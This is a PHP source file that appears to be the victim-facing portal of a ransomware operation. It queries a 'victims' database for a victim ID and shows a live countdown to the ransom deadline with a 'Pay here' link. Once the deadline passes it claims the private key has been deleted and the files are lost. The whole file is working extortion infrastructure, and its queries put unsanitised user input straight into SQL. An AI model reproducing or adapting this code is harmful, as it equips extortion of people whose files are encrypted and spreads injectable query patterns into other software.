<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

$targetID = $_POST['target_id'];

if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$targetID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while($row = $result->fetch_assoc()) {
          if ($row['time_left'] < "00:00:01") {
             echo "Time expired, your associated private key has been deleted and your files forever lost!";
          } else {
             echo "Time Remaining for $targetID: " . $row['time_left'] . "<br /><br />";

             setcookie("unique_id", $targetID, strtotime('+1 year'));

             $page = $_SERVER['PHP_SELF'];
             $sec = "1";
             header("Refresh: $sec; url=$page");
          }
      } 
   } else {
      echo "<br />Could not determine the time left!</br>"; 
   }
} else {
   if (isset($_COOKIE['unique_id']) && !empty($_COOKIE['unique_id'])) {
      $uniqueID = $_COOKIE['unique_id'];

      $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
      $result = $conn->query($sql);

      if ($result->num_rows > 0) {
         while($row = $result->fetch_assoc()) {
             if ($row['time_left'] < "00:00:01") {
                echo "<center><font color='red'>";
                echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
                echo "</font></center>";
             } else {
                echo "<center><font color='red'>";
                echo "<h1>Time Remaining for $uniqueID: " . $row['time_left'] . "</h1><br /><br />";
                echo "<a href='/payment.php'>Pay here</a><br /><br />";
                echo "</font></center>";
                $page = $_SERVER['PHP_SELF'];
                $sec = "1";
                header("Refresh: $sec; url=$page");
            }
        }
     } else {
        echo "<br />Could not determine the time left!</br>";
     }  
   }
}

$conn->close();

?>

<html>
<head>
  <title>
    Decryption Check
  </title>
</head>
<body>
<br /><br />
<form action="dec_auth.php" method="POST">
 Unique ID: <input type="text" name="target_id">
 <br />
 <input type="submit" value="Submit">
</form>
</body>
<html>
